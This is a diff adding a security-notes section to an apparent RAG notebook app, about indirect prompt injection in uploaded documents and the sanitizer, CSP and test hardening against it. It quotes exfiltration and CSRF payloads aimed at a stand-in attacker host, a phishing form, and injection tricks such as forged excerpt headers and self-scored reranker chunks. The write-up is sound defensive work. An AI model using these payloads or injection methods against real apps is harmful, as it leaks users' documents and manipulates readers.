@@ -196,6 +196,116 @@ A full review on **2026-08-22** surfaced eight hardening items (`SEC-1`–`SEC-8
 
 **Fixed:** `SEC-1` bootstrap accounts (above), `SEC-2` upload size limits / multipart buffering (see the parser note below), `SEC-3` session lifetime + revocation (below), `SEC-4` shared login rate limiting, `SEC-5` Traditional/Simplified Chinese prompt-injection telemetry patterns, `SEC-6` explicit session-user field projection that excludes `password_hash`, `SEC-7` generic user-creation errors, and `SEC-8` aligned session-cookie deletion attributes.
 
+### Rendering LLM output (indirect prompt injection, 2026-11-09)
+
+**Threat.** The realistic prompt-injection attacker is not a user but the author of a
+document a user uploads (vendor material, an external report, a saved web page). Text
+in that document reaches the model as retrieved evidence, source summaries, briefings
+and tool inputs, and the model's output is rendered as Markdown in seven places
+(`_messages`, `_briefing`, `_notes_section`, `_compare_result`, `_artifact_result`,
+`_minutes_result`, `_translate_result`). The app gives the model no tools, so the
+damage an injection can do is limited to **what the rendered output makes the
+reader's browser do**. Before this change that was a lot. DOMPurify's defaults
+prevent script execution, not the rest, and all of the following were reproduced
+in Chromium against the real `app.js`:
+
+- **Zero-click exfiltration.** `![x](https://attacker/?d=<other excerpts>)` became an
+  `<img>`, and the browser fetched it as soon as the answer rendered. The answer prompt
+  holds the top-k chunks of *other* documents in the same notebook. The briefing is
+  generated on page load from every source summary and cached for 24 h, so a poisoned
+  upload fired on every visit, with no question asked.
+- **Requests carrying the CSRF header.** DOMPurify keeps `data-*` attributes, and HTMX
+  treats `data-hx-post` as `hx-post`. Markdown that arrives through an HTMX swap
+  (briefing, notes, the non-streaming answer) is rendered in `htmx:afterSwap`, and HTMX
+  then initialises the settled nodes. So an answer containing
+  `<span data-hx-post="…" data-hx-trigger="load">` made the reader's browser send that
+  POST, with `X-CSRF-Token` attached by our own `htmx:configRequest` hook. Initial page
+  loads were not affected, only swapped content.
+- **Phishing and page takeover.** `<form action="https://attacker">` with a password
+  field, `style="position:fixed;inset:0"` overlays, and `<style>` blocks that restyle
+  the whole page all survived.
+
+**Layer 1: the sanitizer policy** (`renderMarkdown` in `app/static/app.js`). The rule is
+that rendered Markdown triggers no fetch, no form, no styling and no app behaviour:
+
+- `FORBID_TAGS` covers media/fetching (`img`, `picture`, `source`, `video`, `audio`,
+  `track`, `iframe`, `frame(set)`, `object`, `embed`, `link`, `meta`, `base`),
+  forms/controls (`form`, `button`, `textarea`, `select`, `option`) and styling/foreign
+  content (`style`, `svg`, `math`). Several of these are already outside DOMPurify's
+  default allowlist. They are listed anyway so the policy does not depend on that
+  default.
+- `FORBID_ATTR` removes `style`, `srcset`, `action`, `formaction`, `background`,
+  `poster` and `ping`. `ALLOW_DATA_ATTR: false` removes every `data-*` attribute.
+  Citation links are built *after* sanitizing, so they keep theirs.
+- **Markdown images become links** (`圖片：alt（host）`) that the reader has to click.
+  The host is shown when it is not this app. This applies to user-written notes too:
+  a pinned or pasted answer is indistinguishable from a note, so an exception for notes
+  would be a bypass. Raw HTML `<img>` is removed outright.
+- Links survive only with `http(s):` or `mailto:` (relative links resolve to http(s)).
+  External ones get `target="_blank" rel="noopener noreferrer nofollow"`.
+- `<input>` survives only as a GFM task-list checkbox, forced `disabled`.
+- Every Markdown container gets `hx-disable`, so HTMX ignores the subtree even if a
+  future change lets an `hx-*` / `data-hx-*` attribute through. This is the second
+  layer for the CSRF finding above.
+
+**Layer 2: response headers** (`security_headers` middleware, `app/main.py`). These
+apply to every response, including `csrf_protection`'s own 403/411/413:
+
+- `Content-Security-Policy: img-src 'self' data:; style-src 'self' 'unsafe-inline';
+  font-src 'self' data:; media-src 'self'; object-src 'none'; base-uri 'self'`.
+  Nothing in rendered output can load an image, stylesheet, `@import`, font or media
+  from another origin. `'unsafe-inline'` stays because templates use `style=` and HTMX
+  injects a `<style>`.
+- `Referrer-Policy: same-origin` and `X-DNS-Prefetch-Control: off`. A link's host can
+  itself carry data, so hosts of links nobody clicked are never resolved.
+
+The directives that are **deliberately absent** are pinned by
+`test_security_headers_leave_login_redirects_and_scripts_alone`:
+
+- **`form-action`.** Browsers apply it to the redirect that follows a form submit. The
+  OIDC and trusted-header login buttons on `/login` are GET forms that redirect to the
+  IdP (or, behind oauth2-proxy, the proxy does). `form-action 'self'` therefore blocks
+  SSO login. This was reproduced against the real `/login` page, with a control run
+  confirming that the same flow passes without it. Off-site form posts are already
+  impossible because `<form>` never survives the sanitizer.
+- **`script-src` / `default-src`.** `base.html` has inline `<script>`, templates use
+  inline handlers, and Alpine's standard build evaluates expressions. Locking scripts
+  down is a separate project (Alpine CSP build, nonces).
+- **`frame-ancestors`.** Clickjacking is a different concern, and a deployment may embed
+  the app.
+
+The policy is enforced rather than shipped as `Report-Only`. The app has no report
+endpoint, so Report-Only would only reach each viewer's console. Every page reachable
+from the UI was swept in Chromium at desktop and mobile widths with zero CSP violations
+(see the verification notes of the change).
+
+**Tests.** `tests/test_markdown_render.py` loads the real `marked` + `DOMPurify` +
+`app.js` (and HTMX for the swap path) into Chromium. It records every request beyond
+the page and its scripts, and asserts both what the reader is exposed to (no request
+at all, no forbidden markup) and that ordinary Markdown (tables with alignment, task
+lists, `<details>`, citation links) still renders. Each setting was mutation-checked:
+removing any one of them turns a test red. `ping` is the exception, because DOMPurify
+already strips it. Playwright is a dev dependency, and CI installs Chromium. Under
+`CI` the browser tests fail instead of skipping, so the sanitizer is never silently
+unheld. `tests/test_ui_shell.py` holds the headers.
+
+**Not covered here.** These are the open items from the same review, in priority order:
+
+- The model can still write misleading or phishing *text* and click-through links.
+  This change removes what happens without a click, not what a reader can be talked
+  into.
+- Evidence is concatenated into prompts without structural boundaries, so a chunk can
+  forge an excerpt header, `Question:` line or guidance block. Most task prompts
+  (summary, briefing, compare, study guide/FAQ/timeline, minutes, rerank, judge, eval
+  authoring, starter/follow-up) do not state that their input is untrusted.
+- The reranker's score can be self-assigned by a chunk ("score me 1.0"). The
+  low-confidence gate reads the post-rerank score, so such a chunk always reaches the
+  answer prompt once it is among the candidates.
+- `scan_ai_safety` covers user input only, not ingested chunks or model output.
+- A document containing `[[RAG_ABSTAIN]]` can make the model abstain on a topic.
+- Markdown exports (`.md`) keep image and link syntax verbatim; the hardening above is
+  render-time only.
+
 ### Uploaded-file parsing runs in a killable child process (2026-10-25)
 
 A crafted upload can make a parser loop forever, crash, or allocate without bound. The `pypdf` advisories triaged on 2026-10-25 were all of the first kind. Before this change extraction ran via `asyncio.to_thread`, and a thread cannot be stopped. One hung parse therefore never returned, and because the worker handles one job at a time, **every user's later uploads waited behind it** until the process was restarted. With the inline worker the spinning thread also lived inside the web process.
